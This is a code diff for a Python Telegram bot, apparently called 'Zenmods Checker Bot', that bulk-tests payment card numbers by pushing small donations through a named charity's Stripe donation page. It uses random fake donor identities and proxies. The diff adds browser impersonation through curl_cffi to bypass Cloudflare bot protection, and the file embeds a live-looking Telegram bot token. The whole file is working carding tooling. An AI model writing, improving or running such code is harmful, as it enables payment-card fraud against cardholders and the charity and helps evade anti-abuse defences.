@@ -4,7 +4,7 @@ import re
 import string
 import time
 from urllib.parse import quote_plus
-import requests
+from curl_cffi import requests
 import telebot
 
 TELEGRAM_BOT_TOKEN = "8664861867:AAF5Wq79aekFKDcE6vFT2jFO_3w4jjFgLmk"
@@ -13,13 +13,7 @@ authorized_users = set()
 
 bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN, parse_mode="Markdown")
 
-HTTP_TIMEOUT = (10, 25)
-
-USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
-]
+HTTP_TIMEOUT = 30
 
 FIRST_NAMES = [
     'James', 'John', 'Robert', 'Michael', 'William', 'David', 'Richard',
@@ -68,9 +62,9 @@ def classify_gate_response(text):
     else:
         return "declined", text[:100], "declined"
 
-def _http_error(exc: requests.RequestException) -> dict:
+def _http_error(exc) -> dict:
     low = str(exc).lower()
-    if isinstance(exc, requests.Timeout) or "timed out" in low:
+    if "timed out" in low or "timeout" in low:
         return {"status": "ERROR", "response": "Request timed out", "time": "0s"}
     return {"status": "ERROR", "response": str(exc)[:200], "time": "0s"}
 
@@ -81,7 +75,6 @@ def _process_card_sync(cc: str, mm: str, yy: str, cvc: str, proxy_url: str | Non
     mm = mm.zfill(2)
 
     try:
-        user_agent = random.choice(USER_AGENTS)
         first_name = random.choice(FIRST_NAMES)
         last_name = random.choice(LAST_NAMES)
         full_name = f"{first_name} {last_name}"
@@ -93,15 +86,13 @@ def _process_card_sync(cc: str, mm: str, yy: str, cvc: str, proxy_url: str | Non
         city, state, zip_prefix = random.choice(CITIES_STATES)
         zip_code = zip_prefix + str(random.randint(10, 99))
 
-        session = requests.Session()
-        session.trust_env = False
+        session = requests.Session(impersonate="chrome120")
         if proxy_url:
             session.proxies = {"http": proxy_url, "https": proxy_url}
 
         init_headers = {
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
             'accept-language': 'en-US,en;q=0.9',
-            'user-agent': user_agent,
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'none',
@@ -115,7 +106,7 @@ def _process_card_sync(cc: str, mm: str, yy: str, cvc: str, proxy_url: str | Non
             elapsed = f"{time.perf_counter() - started:.2f}s"
             return {
                 "status": "ERROR",
-                "response": f"Donate page HTTP {init_resp.status_code}",
+                "response": f"Donate page HTTP {init_resp.status_code} (Cloudflare Bypass Blocked)",
                 "time": elapsed,
             }
 
@@ -136,7 +127,6 @@ def _process_card_sync(cc: str, mm: str, yy: str, cvc: str, proxy_url: str | Non
                     'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                     'origin': 'https://forcesforchange.org',
                     'referer': 'https://forcesforchange.org/donate/',
-                    'user-agent': user_agent,
                     'x-requested-with': 'XMLHttpRequest',
                 },
                 data={'product_id': product_id, 'quantity': '1'},
@@ -158,7 +148,6 @@ def _process_card_sync(cc: str, mm: str, yy: str, cvc: str, proxy_url: str | Non
                         'content-type': 'application/x-www-form-urlencoded',
                         'origin': 'https://forcesforchange.org',
                         'referer': 'https://forcesforchange.org/donate/',
-                        'user-agent': user_agent,
                     },
                     data=dict(inputs),
                     timeout=HTTP_TIMEOUT,
@@ -187,7 +176,6 @@ def _process_card_sync(cc: str, mm: str, yy: str, cvc: str, proxy_url: str | Non
             'content-type': 'application/x-www-form-urlencoded',
             'origin': 'https://js.stripe.com',
             'referer': 'https://js.stripe.com/',
-            'user-agent': user_agent,
         }
 
         stripe_data = (
@@ -240,7 +228,6 @@ def _process_card_sync(cc: str, mm: str, yy: str, cvc: str, proxy_url: str | Non
             'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
             'origin': 'https://forcesforchange.org',
             'referer': 'https://forcesforchange.org/donate/',
-            'user-agent': user_agent,
             'x-requested-with': 'XMLHttpRequest',
         }
 
@@ -292,14 +279,11 @@ def _process_card_sync(cc: str, mm: str, yy: str, cvc: str, proxy_url: str | Non
             return {"status": "APPROVED", "response": out_msg or clean, "time": elapsed}
         return {"status": "DECLINED", "response": out_msg or clean, "time": elapsed}
 
-    except requests.RequestException as exc:
+    except Exception as exc:
         elapsed = f"{time.perf_counter() - started:.2f}s"
         err = _http_error(exc)
         err["time"] = elapsed
         return err
-    except Exception as exc:
-        elapsed = f"{time.perf_counter() - started:.2f}s"
-        return {"status": "ERROR", "response": str(exc)[:200], "time": elapsed}
 
 def check_single_cc(cc_str: str):
     parts = cc_str.replace("/", "|").split("|")
@@ -325,7 +309,7 @@ def process_bulk_file(chat_id, file_content):
         bot.send_message(chat_id, "⚠️ File is empty or no cards found!")
         return
 
-    bot.send_message(chat_id, f"⚡ **Zenmods ForcesForChange Engine** ⚡\nTotal cards: `{total_cards}`.\n🚀 Checking strictly 1 by 1 in real-time...")
+    bot.send_message(chat_id, f"⚡ **Zenmods Cloudflare Bypass Engine** ⚡\nTotal cards: `{total_cards}`.\n🚀 Checking strictly 1 by 1 in real-time...")
 
     for index, card_line in enumerate(lines, start=1):
         res = check_single_cc(card_line)
@@ -336,7 +320,7 @@ def process_bulk_file(chat_id, file_content):
 
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
-    bot.reply_to(message, "Welcome to Zenmods ForcesForChange Checker Bot! Send /auth <code > to authorize or upload a text file.")
+    bot.reply_to(message, "Welcome to Zenmods Checker Bot! Send /auth <code > to authorize or upload a text file.")
 
 @bot.message_handler(commands=['auth'])
 def authorize_user(message):
